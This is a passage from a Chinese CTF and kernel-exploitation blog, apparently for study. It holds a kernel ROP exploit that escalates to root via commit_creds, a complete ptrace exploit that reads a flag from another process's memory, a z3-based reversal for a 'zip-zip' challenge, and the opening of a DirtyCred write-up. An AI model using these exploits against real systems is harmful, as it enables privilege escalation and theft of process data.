class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        save_status();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        fd = open(<span class="string">&quot;/dev/test&quot;</span>, O_RDWR); </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x40</span>];</span><br><span class="line">        read(fd,buf,<span class="number">0x40</span>);</span><br><span class="line">        <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;canary: %p\n&quot;</span>, canary);</span><br><span class="line">        <span class="keyword">size_t</span> rbp = ((<span class="keyword">size_t</span> *)buf)[<span class="number">4</span>];</span><br><span class="line">        </span><br><span class="line">        find_symbols();</span><br><span class="line">        <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        rop[<span class="number">2</span>] = canary;</span><br><span class="line">        rop[<span class="number">3</span>] = rbp;</span><br><span class="line">        rop[<span class="number">4</span>] = &amp;get_root;                 </span><br><span class="line">        write(fd,rop,<span class="number">0x100</span>);</span><br><span class="line">        ioctl(fd,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="injection2-0"><a href="#injection2-0" class="headerlink" title="injection2.0"></a>injection2.0</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">FILE=./_install/flag</span><br><span class="line">if test -f &quot;$FILE&quot;; then</span><br><span class="line">    cd ./_install &amp;&amp; find . | cpio -o --format=newc &gt; ../rootfs.img &amp;&amp;cd .. &amp;&amp;sh boot.sh	</span><br><span class="line">else</span><br><span class="line">	echo $1&gt;./_install/flag &amp;&amp; chmod 755 ./_install/flag &amp;&amp; cd ./_install &amp;&amp; find . | cpio -o --format=newc &gt; ../rootfs.img &amp;&amp;cd .. &amp;&amp;sh boot.sh</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">chown 0:0 flag</span><br><span class="line">chmod 755 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">./target &gt;pso.file 2&gt;&amp;1 &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line"><span class="meta">#</span><span class="bash">setsid /bin/cttyhack setuidgid 0 /bin/sh <span class="comment"># 修改 uid gid 为 0 以提权 /bin/sh 至 root。</span></span></span><br><span class="line">poweroff -f # 设置 shell 退出后则关闭机器</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>这个题目有如下特点：</p>
<ul>
<li>没有挂载内核模块</li>
<li>网上搜索到 <code>/proc/sys/kernel/yama/ptrace_scope</code> 的作用是 “控制对 ptrace 系统调用的响应”</li>
<li>将文件 <code>target</code> 加载到了后台</li>
</ul>
<p>先看一眼文件 <code>target</code> 的内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;./flag&quot;</span>, <span class="number">436</span>, envp);</span><br><span class="line">  read(fd, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  system(<span class="string">&quot;rm flag&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello World\n&quot;</span>, <span class="number">0xC</span>uLL);</span><br><span class="line">    sleep(<span class="number">2u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>把 flag 读取到本地内存，然后删除 flag 文件，循环输入 <code>Hello World</code></li>
</ul>
<p>打比赛时想到使用 ptrace 接口去连接程序，但不知道怎么获取栈上的数据，最后没做出来</p>
<p>赛后复现时才发现可以用 <code>ps -ef</code> 获取进程的 PID，然后 <code>cat /proc/pid/maps</code> 获取栈基址，最后在本地计算一下偏移，使用 ptrace 接口去读 flag 就好了</p>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argv , <span class="keyword">char</span> **argc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="keyword">int</span> stat;</span><br><span class="line">    <span class="keyword">int</span> pid = atoi(argc[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(&amp;stat);    </span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> addr = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%llx&quot;</span>,&amp;addr);</span><br><span class="line">    <span class="keyword">for</span> (; addr &lt; <span class="number">0x7ffffffff000</span>; ++addr)</span><br><span class="line">    &#123;</span><br><span class="line">        data = ptrace(PTRACE_PEEKDATA, pid, addr, <span class="literal">NULL</span>);    </span><br><span class="line">        <span class="keyword">if</span>(data==<span class="number">0x65636165</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;data = %x , addr = %llx\n&quot;</span> , data , addr);</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> addr1=addr<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">char</span> data1;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                addr1+=<span class="number">1</span>;</span><br><span class="line">                data1 = ptrace(PTRACE_PEEKDATA, pid, addr1, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span> , data1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="zip-zip"><a href="#zip-zip" class="headerlink" title="zip-zip"></a>zip-zip</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">4f</span>529bda60e1a98759dcb5e28ce1ee39d7410b7a, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，statically，Partial RELRO，canary</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0004</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A != execve) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0005</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<ul>
<li>ban 了 <code>execve</code></li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">_isoc99_scanf((__int64)<span class="string">&quot;%2560s&quot;</span>, file);</span><br><span class="line">getchar();</span><br><span class="line">fd = fopen64((__int64)file, (__int64)<span class="string">&quot;rb&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>zip</code> 拥有打开文件的机会</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;unzip file&quot;</span>);</span><br><span class="line">_isoc99_scanf((__int64)<span class="string">&quot;%1s&quot;</span>, file);</span><br><span class="line">getchar();</span><br><span class="line">fd = fopen64((__int64)file, (__int64)<span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd )</span><br><span class="line">&#123;</span><br><span class="line">    fwrite(chunk2, <span class="number">1LL</span>, len, fd);</span><br><span class="line">    fclose(fd);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>unzip</code> 可以把 <code>zip</code> 的文件内容读取到堆中</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>我的思路就是：使用 <code>zip</code> 压缩 flag，然后使用 <code>unzip</code> 读取到堆中</p>
<p>在此之前，需要先对 <code>encrypt</code> 函数进行逆向，以绕过 <code>unzip</code> 的限制</p>
<p>核心加密代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  index = i;</span><br><span class="line">  <span class="keyword">if</span> ( index &gt;= (<span class="keyword">unsigned</span> __int64)j_strlen_ifunc(CDK) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  code[i] = CDK[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  index = j;</span><br><span class="line">  <span class="keyword">if</span> ( index &gt;= (<span class="keyword">unsigned</span> __int64)j_strlen_ifunc(CDK) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; param1; ++k )</span><br><span class="line">    code2 = code2 * code[j] % param2;</span><br><span class="line">  c[j] = code2;</span><br><span class="line">  code2 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>param1 == 7</code></li>
<li><code>param2 == 221</code></li>
</ul>
<p>其实就是 <code>(x^7) % 221 == c</code>，已知 <code>c</code> 求 <code>x</code></p>
<p>这里直接用 z3 来解了：（因为是静态链接，用 angr 不如 z3 方便）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a,b,c = Ints(<span class="string">&#x27;a b c&#x27;</span>)</span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add((a*a*a*a*a*a*a%<span class="number">221</span>)==<span class="number">0x95</span>) <span class="comment"># 这里用**表示乘方会报错 </span></span><br><span class="line">solver.add((b*b*b*b*b*b*b%<span class="number">221</span>)==<span class="number">0x6C</span>)</span><br><span class="line">solver.add((c*c*c*c*c*c*c%<span class="number">221</span>)==<span class="number">0x18</span>)</span><br><span class="line">solver.add(a&gt;<span class="number">0</span>)</span><br><span class="line">solver.add(b&gt;<span class="number">0</span>)</span><br><span class="line">solver.add(c&gt;<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> solver.check() == sat: </span><br><span class="line">    ans = solver.model()</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no ans!&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a = <span class="number">72</span>, c = <span class="number">80</span>, b = <span class="number">82</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>结果为 “HRP”</li>
</ul>
<p>打比赛时就做到这里，接着就不知道怎么泄露了</p>
<p>官方 wp 的做法如下：</p>
<ul>
<li>让 <code>zip</code> 出来的文件和二进制文件 <code>pwn</code> 同名，这样就可以覆盖 <code>pwn</code>（此时不会破坏程序）</li>
<li>在 <code>unzip</code> 的时候发送 <code>Ctrl+D</code>(手动输入)，程序就会结束输入，这样 <code>unzip</code> 的默认 <code>filename</code> 就是上次在 <code>zip</code> 输入的文件名，也就是 <code>pwn</code></li>
<li>再次 nc 时就可以通过报错信息拿到 flag</li>
</ul>
<p>我自己复现的时候发现 <code>fopen</code> 打不开正在运行的文件：（不管是主机还是 docker 都一样）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_file_fopen (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode,</span><br><span class="line">            <span class="keyword">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp)) <span class="comment">/* 检查文件是否以打开,打开则返回 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> (*mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      ...    </span><br><span class="line">     &#125;</span><br><span class="line">  ...</span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">              is32not64);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_fopen, _IO_file_fopen)</span><br></pre></td></tr></table></figure>
<p>这就有点搞不懂了，暂时放一放</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/28/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cred/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/28/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cred/" class="post-title-link" itemprop="url">Kernel 现实漏洞复现：Dirty Cred</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-28 12:59:46 / Modified: 13:01:49" itemprop="dateCreated datePublished" datetime="2022-12-28T12:59:46+08:00">2022-12-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>44k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>40 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Dirty Cred 漏洞成因</strong></p>
<p>DirtyCred，一种新的通用漏洞利用方法，不用依赖 Linux 的 pipeline 机制，只需利用堆内存破坏类型的漏洞 </p>
<p>攻击适用版本：</p>
<ul>
<li>Linux Kernel版本 &gt;= 2.6.12 </li>
<li>Linux Kernel版本 &lt;= 5.19.1 </li>
</ul>
<p>在 Linux 内核的 <code>net/sched/cls_route.c</code> 实现的 <code>route4_change</code> 中发现了一个漏洞，该漏洞源于释放后重用，本地攻击者利用该漏洞会导致系统崩溃，可能会造成本地特权升级问题 </p>
<p>由于将 <code>route4_filter</code> 对象从链表中删除和释放时的检查条件不一致，导致该对象被释放后仍存于链表中，后面可以触发 Double-Free</p>
<p><strong>前置知识 - 内核凭证 Credential</strong></p>
<p>Kernel 凭证是 kernel 文档中定义的 kernel 中携带特权信息的特征，表示权限和对应的能力，主要分为：</p>
<ul>
<li>task 凭证（<code>struct cred</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; 